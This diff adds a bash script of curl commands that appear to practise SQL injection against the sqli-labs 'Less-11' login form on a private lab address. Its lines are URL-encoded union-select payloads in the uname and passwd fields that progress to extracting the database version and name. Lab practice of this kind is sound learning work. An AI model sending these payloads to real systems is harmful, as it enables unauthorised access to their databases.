@@ -1,0 +1,10 @@
+#!/bin/bash
+
+# 1
+#curl -X POST -d "uname=1&passwd=1&submit=Submit" "http://192.168.1.48:8081/Less-11/"
+# 2
+#curl -X POST -d "uname=1%27%20and%201%20=%202%20%23&passwd=1&submit=Submit" "http://192.168.1.48:8081/Less-11/"
+#curl -X POST -d "uname=1%27%20union%20select%201%2C2%20%23&passwd=1&submit=Submit" "http://192.168.1.48:8081/Less-11/"
+# 3
+curl -X POST -d "uname=1%27%20union%20select%20version%28%29%2Cdatabase%28%29%23&passwd=1&submit=Submit" "http://192.168.1.48:8081/Less-11/"
+#curl -X POST -d "uname=&passwd=1%27+union+select+version%28%29%2Cdatabase%28%29+%23&submit=Submit" "http://192.168.1.48:8081/Less-11/"
